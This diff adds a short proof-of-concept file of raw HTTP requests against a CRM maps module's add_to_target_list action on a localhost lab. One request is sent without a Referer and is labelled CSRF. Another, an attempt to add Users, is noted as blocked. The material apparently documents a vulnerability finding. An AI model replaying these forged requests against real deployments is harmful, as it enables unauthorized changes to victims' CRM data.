@@ -1,0 +1,19 @@
+### (a) add Contact C1, with Referer
+POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1
+Cookie: PHPSESSID=<L session>
+Referer: http://localhost:33116/index.php?module=jjwg_Maps&action=index
+
+list_id=ea3c4b69-c196-4405-9a7e-cff7642bff7f&display_module=Contacts&selected_ids=6771aa54-f572-484a-8f63-7aad7bfcbb81
+
+### (b) add Contact C2, NO Referer at all (CSRF)
+POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1
+Cookie: PHPSESSID=<L session>
+
+list_id=ea3c4b69-c196-4405-9a7e-cff7642bff7f&display_module=Contacts&selected_ids=2a52115c-db15-44e3-811f-2e1c6b324773
+
+### (c) attempt Users add (empirically blocked in this lab's default config)
+POST /index.php?module=jjwg_Maps&action=add_to_target_list HTTP/1.1
+Cookie: PHPSESSID=<L session>
+Referer: http://localhost:33116/index.php?module=jjwg_Maps&action=index
+
+list_id=ea3c4b69-c196-4405-9a7e-cff7642bff7f&display_module=Users&selected_ids=1
